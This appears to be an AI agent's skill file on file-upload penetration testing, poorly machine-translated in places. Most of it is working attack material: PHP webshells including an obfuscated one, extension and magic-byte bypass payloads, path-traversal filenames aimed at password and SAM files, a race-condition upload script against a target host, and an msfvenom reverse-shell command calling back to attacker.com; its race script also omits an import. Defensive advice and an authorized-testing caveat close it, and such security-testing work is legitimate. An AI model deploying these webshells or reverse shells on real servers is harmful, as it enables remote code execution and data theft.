---
name: file-upload-testing
Professional skills and methodology for file-upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

This skill provides detection, use, and protection against file-upload vulnerabilities.

## Vulnerability Types

### 1. File type not verified

**Frontend only:**
```javascript
// It's been bypassed.
if (!file.name.endsWith('.jpg')) {
  alert('Only upload pictures are allowed');
}
```

### 2. File content not verified

**Check extension only:**
```php
// Dangerous code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unfiltered filename:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Filename Overwrite

**Predictable title:**
```
uploads/1.jpg
uploads/2.jpg
```

## Test Method

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extension:**
```
shell.php.jpg
shell.jpg.php
```

**Test case:**
```
shell.PHP
shell.PhP
```

### 2. Content type bypass

**Modified Content-Type:**
```
Content-Type: image/jpeg
# But the contents of the document are:PHPCode
```

**Magic Bytes:**
```php
// Yes.PHPAdd a header before the code
GIF89a<?php phpinfo(); ?>
```

### 3. Parse the Vulnerability

**Apache parse leak:**
```
shell.php.xxx  # ApacheCould be parsed asPHP
```

**IIS parse leak:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parse leak:**
```
shell.jpg%00.php
```

### 4. Competition conditions

**Accessed immediately after uploading:**
```python
# Upload. phpFile, access before uploading but deleating
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Base Webshell:**
```php
<?php system($_GET['cmd']); ?>
```

**One word for a wooden horse:**
```php
<?php eval($_POST['a']); ?>
```

**Close filters:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Using: ?cmd=system
```

### . htaccessExploit

**Upload. haccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell. jpg (actually PHP code)**

### Image webshell

**GIF Photo horse:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG photo horse:**
```bash
# Use tool willPHPCode EmbeddedPNG
python3 png2php.py shell.php shell.png
```

### File Include Compatibility

**If there is a file containing a bug:**
```
# Upload IncludePHPPicture of the code
# And then include execution through the document.
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension bypassed

**Double extensions:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case size:**
```
shell.PHP
shell.PhP
```

**Special character:**
```
shell.php.
shell.php
shell.php%20
```

### Content-TypeBypass

**Revised requesthead:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic BytesBypass

**Add header:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Confusion

**Using short labels:**
```php
<?= system($_GET['cmd']); ?>
```

**Using variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Using the Tools

### Burp Suite

1. Interception of file upload request
2. Modify File Name and Contents
3. Test all kinds of bypass techniques.

### Upload Bypass

```bash
# Upload using various technical test files
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShellGenerate

```bash
# Generates a variety ofWebShell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and Reporting

### Verification Steps

1. Confirm that you can upload malicious documents.
2. Verify that the file executes
3. Assess the impact (order execution, data disclosure, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Leak position and upload function
- Type of file and manner of implementation that can be uploaded
- the complete exploitation steps andPoC
- Recommendations for restoration (document type validation, content checking, secure storage, etc.)

## Preventive Measures

### Recommended Approach

1. **White list of document types **
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **Document content validation **
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename File **
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated Storage **
   - File stored outside the Web root directory
   - Access via script proxy
   - Disable executory permissions

5. **File Scanning **
   - Scanning with anti-drug software
   - Check file contents
   - Remove executable permissions

6. **Size Limit **
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Important Notes

- Perform only in an authorized testing environment
- Avoid uploading malicious documents to the production environment
- Clean up in a timely manner after testing
- Pay attention to differences in the resolution of different servers